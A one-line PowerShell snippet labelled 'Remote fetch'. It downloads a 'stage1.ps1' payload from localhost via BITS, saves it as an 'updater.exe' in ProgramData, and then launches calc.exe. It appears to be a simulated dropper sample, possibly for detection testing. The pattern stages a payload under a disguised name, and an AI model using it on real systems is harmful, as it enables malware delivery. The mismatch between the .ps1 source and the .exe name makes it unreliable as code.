
<# Remote fetch #> $PayloadUrl = "http://127.0.0.1/stage1.ps1"; $LocalPath = 'C:\ProgramData\updater.exe'; $TransferTimeout = 90; Start-BitsTransfer -Source $PayloadUrl -Destination $LocalPath; Start-Process -FilePath "calc.exe"; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
